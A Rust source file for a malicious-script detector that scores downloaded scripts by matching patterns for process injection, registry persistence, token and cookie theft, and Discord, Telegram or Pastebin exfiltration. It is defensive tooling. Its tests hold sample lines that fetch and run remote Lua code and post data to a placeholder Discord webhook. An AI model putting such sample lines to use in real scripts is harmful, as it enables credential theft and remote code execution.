//! Script payload analysis for detecting malicious patterns in downloaded scripts.

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Language of a script payload.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ScriptLanguage {
    Lua,
    JavaScript,
    Python,
    Batch,
    PowerShell,
    Unknown,
}

/// Type of behavior observed in a script.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum BehaviorType {
    WebRequest,
    FileWrite,
    FileRead,
    SystemCommand,
    ProcessManipulation,
    RegistryAccess,
    Persistence,
    DataExfiltration,
    ClipboardAccess,
    DynamicCodeExecution,
    Other,
}

/// A single behavior detected in a script.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptBehavior {
    /// The type of behavior.
    pub behavior_type: BehaviorType,
    /// Human-readable description.
    pub description: String,
    /// Severity on a 1-10 scale.
    pub severity: u8,
    /// The line content where the behavior was found.
    pub line_content: String,
}

/// Type of data exfiltration target.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExfilTargetType {
    Discord,
    Telegram,
    CustomServer,
    Pastebin,
}

/// A detected data exfiltration target.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExfilTarget {
    /// The type of exfiltration target.
    pub target_type: ExfilTargetType,
    /// The URL or pattern that matched.
    pub url_or_pattern: String,
}

/// Full analysis of a script payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptAnalysis {
    /// Detected script language.
    pub language: ScriptLanguage,
    /// Overall risk score (0-100).
    pub risk_score: u32,
    /// Behaviors detected in the script.
    pub behaviors: Vec<ScriptBehavior>,
    /// URLs embedded in the script.
    pub embedded_urls: Vec<String>,
    /// File operations performed by the script.
    pub file_operations: Vec<String>,
    /// System commands executed by the script.
    pub system_commands: Vec<String>,
    /// Data exfiltration targets.
    pub data_exfiltration: Vec<ExfilTarget>,
    /// Summary of the analysis.
    pub summary: String,
}

/// Analysis of a raw payload (binary or text).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadAnalysis {
    /// Whether the payload is a recognized script format.
    pub is_script: bool,
    /// Detected content type.
    pub detected_type: String,
    /// Script analysis (if the payload is a script).
    pub script_analysis: Option<ScriptAnalysis>,
    /// Risk score (0-100).
    pub risk_score: u32,
    /// Summary.
    pub summary: String,
}

/// Analyzer for script content.
#[derive(Debug, Clone)]
pub struct ScriptAnalyzer {
    url_regex: Regex,
    webhook_regex: Regex,
    telegram_regex: Regex,
}

impl Default for ScriptAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl ScriptAnalyzer {
    /// Create a new `ScriptAnalyzer`.
    pub fn new() -> Self {
        Self {
            url_regex: Regex::new(r#"https?://[^\s"'\)\]>]+"#).expect("valid url regex"),
            webhook_regex: Regex::new(
                r#"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"#,
            )
            .expect("valid webhook regex"),
            telegram_regex: Regex::new(
                r#"https://api\.telegram\.org/bot[A-Za-z0-9:_-]+/sendMessage"#,
            )
            .expect("valid telegram regex"),
        }
    }

    /// Analyze a script string and return a full `ScriptAnalysis`.
    pub fn analyze(&self, content: &str) -> ScriptAnalysis {
        let language = self.detect_language(content);
        let behaviors = self.detect_behaviors(content);
        let embedded_urls = self.extract_urls(content);
        let file_operations = self.detect_file_operations(content);
        let system_commands = self.detect_system_commands(content);
        let data_exfiltration = self.detect_exfiltration(content);

        let risk_score = self.calculate_risk_score(&behaviors, &data_exfiltration, &embedded_urls);
        let summary = self.build_summary(
            &language,
            &behaviors,
            &embedded_urls,
            &data_exfiltration,
            risk_score,
        );

        ScriptAnalysis {
            language,
            risk_score,
            behaviors,
            embedded_urls,
            file_operations,
            system_commands,
            data_exfiltration,
            summary,
        }
    }

    /// Analyze a raw payload given its content type.
    pub fn analyze_payload(&self, content: &[u8], content_type: &str) -> PayloadAnalysis {
        let is_text = content_type.contains("text")
            || content_type.contains("json")
            || content_type.contains("javascript")
            || content_type.contains("lua");

        if is_text {
            if let Ok(text) = std::str::from_utf8(content) {
                let analysis = self.analyze(text);
                let risk_score = analysis.risk_score;
                let summary = analysis.summary.clone();
                return PayloadAnalysis {
                    is_script: true,
                    detected_type: content_type.to_string(),
                    script_analysis: Some(analysis),
                    risk_score,
                    summary,
                };
            }
        }

        // Binary payload - basic analysis
        let has_pe_header = content.len() >= 2 && content[0] == b'M' && content[1] == b'Z';
        let risk_score = if has_pe_header { 80 } else { 30 };
        let detected_type = if has_pe_header {
            "application/x-executable".to_string()
        } else {
            content_type.to_string()
        };

        let summary = if has_pe_header {
            "Payload is a Windows executable (PE binary)".to_string()
        } else {
            format!("Binary payload of {} bytes", content.len())
        };

        PayloadAnalysis {
            is_script: false,
            detected_type,
            script_analysis: None,
            risk_score,
            summary,
        }
    }

    /// Detect the scripting language based on content patterns.
    fn detect_language(&self, content: &str) -> ScriptLanguage {
        // Lua indicators
        if content.contains("loadstring")
            || content.contains("getfenv")
            || content.contains("game:GetService")
            || content.contains("local function")
                && (content.contains("end") && content.contains("then"))
        {
            return ScriptLanguage::Lua;
        }

        // PowerShell indicators
        if content.contains("Invoke-WebRequest")
            || content.contains("$env:")
            || content.contains("New-Object System")
            || content.contains("[System.Net")
        {
            return ScriptLanguage::PowerShell;
        }

        // Batch indicators
        if content.contains("@echo off")
            || content.contains("%APPDATA%")
            || content.contains("reg add")
            || content.contains("cmd /c")
        {
            return ScriptLanguage::Batch;
        }

        // Python indicators
        if content.contains("import os")
            || content.contains("import subprocess")
            || content.contains("def ")
                && content.contains(":")
                && content.contains("    ")
        {
            return ScriptLanguage::Python;
        }

        // JavaScript indicators
        if content.contains("document.")
            || content.contains("require(")
            || content.contains("fetch(")
            || content.contains("XMLHttpRequest")
        {
            return ScriptLanguage::JavaScript;
        }

        ScriptLanguage::Unknown
    }

    /// Detect behaviors in the script.
    fn detect_behaviors(&self, content: &str) -> Vec<ScriptBehavior> {
        let mut behaviors = Vec::new();

        for line in content.lines() {
            let trimmed = line.trim();

            // Web requests
            if trimmed.contains("HttpGet")
                || trimmed.contains("HttpPost")
                || trimmed.contains("GetAsync")
                || trimmed.contains("PostAsync")
                || trimmed.contains("request(")
                || trimmed.contains("Invoke-WebRequest")
                || trimmed.contains("fetch(")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::WebRequest,
                    description: "Makes a web request".to_string(),
                    severity: 3,
                    line_content: trimmed.to_string(),
                });
            }

            // File writes
            if trimmed.contains("writefile")
                || trimmed.contains("io.open")
                || trimmed.contains("WriteAllBytes")
                || trimmed.contains("writeFileSync")
                || trimmed.contains("open(") && trimmed.contains("'w'")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::FileWrite,
                    description: "Writes to the file system".to_string(),
                    severity: 6,
                    line_content: trimmed.to_string(),
                });
            }

            // File reads
            if trimmed.contains("readfile")
                || trimmed.contains("io.open") && trimmed.contains("'r'")
                || trimmed.contains("ReadAllText")
                || trimmed.contains("readFileSync")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::FileRead,
                    description: "Reads from the file system".to_string(),
                    severity: 3,
                    line_content: trimmed.to_string(),
                });
            }

            // System commands
            if trimmed.contains("os.execute")
                || trimmed.contains("io.popen")
                || trimmed.contains("subprocess")
                || trimmed.contains("cmd /c")
                || trimmed.contains("Start-Process")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::SystemCommand,
                    description: "Executes a system command".to_string(),
                    severity: 8,
                    line_content: trimmed.to_string(),
                });
            }

            // Process manipulation
            if trimmed.contains("OpenProcess")
                || trimmed.contains("WriteProcessMemory")
                || trimmed.contains("VirtualAllocEx")
                || trimmed.contains("CreateRemoteThread")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::ProcessManipulation,
                    description: "Manipulates another process".to_string(),
                    severity: 9,
                    line_content: trimmed.to_string(),
                });
            }

            // Registry access
            if trimmed.contains("reg add")
                || trimmed.contains("Registry")
                || trimmed.contains("HKEY_")
                || trimmed.contains("HKCU\\")
                || trimmed.contains("HKLM\\")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::RegistryAccess,
                    description: "Accesses the Windows registry".to_string(),
                    severity: 7,
                    line_content: trimmed.to_string(),
                });
            }

            // Persistence mechanisms
            if trimmed.contains("CurrentVersion\\Run")
                || trimmed.contains("Startup")
                    && (trimmed.contains("copy") || trimmed.contains("move"))
                || trimmed.contains("schtasks")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::Persistence,
                    description: "Establishes persistence on the system".to_string(),
                    severity: 9,
                    line_content: trimmed.to_string(),
                });
            }

            // Data exfiltration
            if self.webhook_regex.is_match(trimmed) || self.telegram_regex.is_match(trimmed) {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::DataExfiltration,
                    description: "Sends data to an external service".to_string(),
                    severity: 9,
                    line_content: trimmed.to_string(),
                });
            }

            // Clipboard access
            if trimmed.contains("GetClipboard")
                || trimmed.contains("SetClipboard")
                || trimmed.contains("clipboard")
                    && (trimmed.contains("get") || trimmed.contains("set"))
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::ClipboardAccess,
                    description: "Accesses the clipboard".to_string(),
                    severity: 6,
                    line_content: trimmed.to_string(),
                });
            }

            // Dynamic code execution
            if trimmed.contains("loadstring")
                || trimmed.contains("eval(")
                || trimmed.contains("Invoke-Expression")
                || trimmed.contains("exec(")
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::DynamicCodeExecution,
                    description: "Dynamically executes code".to_string(),
                    severity: 7,
                    line_content: trimmed.to_string(),
                });
            }

            // Token / cookie theft patterns
            if trimmed.contains("discord") && trimmed.contains("token")
                || trimmed.contains("leveldb")
                || trimmed.contains("Local Storage")
                || trimmed.contains(".cookie")
                    && (trimmed.contains("browser") || trimmed.contains("chrome"))
            {
                behaviors.push(ScriptBehavior {
                    behavior_type: BehaviorType::DataExfiltration,
                    description: "Attempts to steal tokens or cookies".to_string(),
                    severity: 10,
                    line_content: trimmed.to_string(),
                });
            }
        }

        behaviors
    }

    /// Extract URLs from script content.
    fn extract_urls(&self, content: &str) -> Vec<String> {
        self.url_regex
            .find_iter(content)
            .map(|m| m.as_str().to_string())
            .collect()
    }

    /// Detect file operation patterns.
    fn detect_file_operations(&self, content: &str) -> Vec<String> {
        let mut ops = Vec::new();
        let patterns = [
            ("writefile", "writefile() call"),
            ("readfile", "readfile() call"),
            ("io.open", "io.open() call"),
            ("appendfile", "appendfile() call"),
            ("delfile", "delfile() call"),
            ("isfile", "isfile() check"),
            ("makefolder", "makefolder() call"),
            ("WriteAllBytes", "WriteAllBytes() call"),
            ("ReadAllText", "ReadAllText() call"),
        ];

        for (pattern, desc) in &patterns {
            if content.contains(pattern) {
                ops.push(desc.to_string());
            }
        }

        ops
    }

    /// Detect system command patterns.
    fn detect_system_commands(&self, content: &str) -> Vec<String> {
        let mut cmds = Vec::new();
        let patterns = [
            ("os.execute", "os.execute() call"),
            ("io.popen", "io.popen() call"),
            ("subprocess.run", "subprocess.run() call"),
            ("cmd /c", "cmd.exe invocation"),
            ("powershell", "PowerShell invocation"),
            ("Start-Process", "Start-Process cmdlet"),
            ("schtasks", "Scheduled task manipulation"),
            ("reg add", "Registry modification"),
        ];

        for (pattern, desc) in &patterns {
            if content.contains(pattern) {
                cmds.push(desc.to_string());
            }
        }

        cmds
    }

    /// Detect data exfiltration targets.
    fn detect_exfiltration(&self, content: &str) -> Vec<ExfilTarget> {
        let mut targets = Vec::new();

        // Discord webhooks
        for m in self.webhook_regex.find_iter(content) {
            targets.push(ExfilTarget {
                target_type: ExfilTargetType::Discord,
                url_or_pattern: m.as_str().to_string(),
            });
        }

        // Telegram bot API
        for m in self.telegram_regex.find_iter(content) {
            targets.push(ExfilTarget {
                target_type: ExfilTargetType::Telegram,
                url_or_pattern: m.as_str().to_string(),
            });
        }

        // Pastebin
        if content.contains("pastebin.com/raw/") || content.contains("paste.ee/p/") {
            if let Some(m) = Regex::new(r#"https?://pastebin\.com/raw/\w+"#)
                .ok()
                .and_then(|re| re.find(content))
            {
                targets.push(ExfilTarget {
                    target_type: ExfilTargetType::Pastebin,
                    url_or_pattern: m.as_str().to_string(),
                });
            }
        }

        // Custom server patterns (POST with sensitive data)
        if content.contains("HttpPost") || content.contains("PostAsync") {
            // Look for POST requests that seem to send stolen data
            if content.contains("token")
                || content.contains("cookie")
                || content.contains("password")
            {
                targets.push(ExfilTarget {
                    target_type: ExfilTargetType::CustomServer,
                    url_or_pattern: "POST request with sensitive data patterns".to_string(),
                });
            }
        }

        targets
    }

    /// Calculate a risk score based on detected behaviors and exfiltration targets.
    fn calculate_risk_score(
        &self,
        behaviors: &[ScriptBehavior],
        exfil: &[ExfilTarget],
        urls: &[String],
    ) -> u32 {
        let mut score: u32 = 0;

        // Sum severity-based scores from behaviors
        for b in behaviors {
            score += (b.severity as u32) * 2;
        }

        // Exfiltration targets are high risk
        score += (exfil.len() as u32) * 15;

        // Many URLs may indicate payload staging
        if urls.len() > 3 {
            score += 10;
        }

        score.min(100)
    }

    /// Build a human-readable summary.
    fn build_summary(
        &self,
        language: &ScriptLanguage,
        behaviors: &[ScriptBehavior],
        urls: &[String],
        exfil: &[ExfilTarget],
        risk_score: u32,
    ) -> String {
        let lang_str = match language {
            ScriptLanguage::Lua => "Lua",
            ScriptLanguage::JavaScript => "JavaScript",
            ScriptLanguage::Python => "Python",
            ScriptLanguage::Batch => "Batch",
            ScriptLanguage::PowerShell => "PowerShell",
            ScriptLanguage::Unknown => "Unknown",
        };

        let risk_label = if risk_score >= 80 {
            "CRITICAL"
        } else if risk_score >= 60 {
            "HIGH"
        } else if risk_score >= 30 {
            "MEDIUM"
        } else {
            "LOW"
        };

        format!(
            "{} script | Risk: {} ({}/100) | {} behavior(s), {} URL(s), {} exfil target(s)",
            lang_str,
            risk_label,
            risk_score,
            behaviors.len(),
            urls.len(),
            exfil.len(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_language_lua() {
        let analyzer = ScriptAnalyzer::new();
        let script = r#"
            local http = game:GetService("HttpService")
            loadstring(http:GetAsync("https://example.com"))()
        "#;
        let analysis = analyzer.analyze(script);
        assert_eq!(analysis.language, ScriptLanguage::Lua);
    }

    #[test]
    fn test_detect_webhook_exfiltration() {
        let analyzer = ScriptAnalyzer::new();
        let script = r#"
            local webhook = "https://discord.com/api/webhooks/123456789/ABCDEFghijklmnop"
            HttpPost(webhook, data)
        "#;
        let analysis = analyzer.analyze(script);
        assert!(!analysis.data_exfiltration.is_empty());
        assert_eq!(
            analysis.data_exfiltration[0].target_type,
            ExfilTargetType::Discord
        );
    }

    #[test]
    fn test_clean_script_low_risk() {
        let analyzer = ScriptAnalyzer::new();
        let script = "print('hello world')";
        let analysis = analyzer.analyze(script);
        assert!(analysis.risk_score < 30);
    }

    #[test]
    fn test_detect_system_commands() {
        let analyzer = ScriptAnalyzer::new();
        let script = r#"os.execute("cmd /c net user")"#;
        let analysis = analyzer.analyze(script);
        assert!(!analysis.system_commands.is_empty());
    }
}
